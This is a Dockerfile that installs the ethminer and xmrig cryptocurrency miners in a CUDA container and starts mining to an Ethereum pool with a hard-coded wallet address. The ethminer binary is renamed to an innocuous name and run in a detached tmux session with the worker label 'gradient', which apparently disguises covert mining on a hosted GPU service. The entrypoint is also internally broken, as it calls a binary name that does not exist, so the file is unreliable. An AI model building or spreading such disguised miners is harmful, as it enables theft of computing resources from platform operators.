
FROM nvidia/cuda:8.0-devel-ubuntu16.04

WORKDIR /

# Package and dependency setup
RUN apt update \
    && apt install -y git \
    tmux \
    wget \
    nano 
    
RUN wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz \
    && tar -xzvf ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz \
    && cd bin \
    && mv ethminer /usr/local/bin/nsf \
    && mkdir /usr/local/bin/kernels \
    && mv kernels/* /usr/local/bin/kernels

RUN wget https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-6.8.2-focal-x64.tar.gz \
    && tar -xzvf xmrig-6.8.2-focal-x64.tar.gz \
    && cd xmrig-6.8.2 \
    && mv xmrig config.json /usr/local/bin/

# Env setup
ENV GPU_FORCE_64BIT_PTR=0
ENV GPU_MAX_HEAP_SIZE=100
ENV GPU_USE_SYNC_OBJECTS=1
ENV GPU_MAX_ALLOC_PERCENT=100
ENV GPU_SINGLE_ALLOC_PERCENT=100

ENTRYPOINT ["tmux new-session -d -s ETH '/usr/local/bin/nsfminer -U -P stratum1+ssl://0xc74104fCb1bE255390b4E1a67742036d7034246C.gradient@us1.ethermine.org:5555'"]
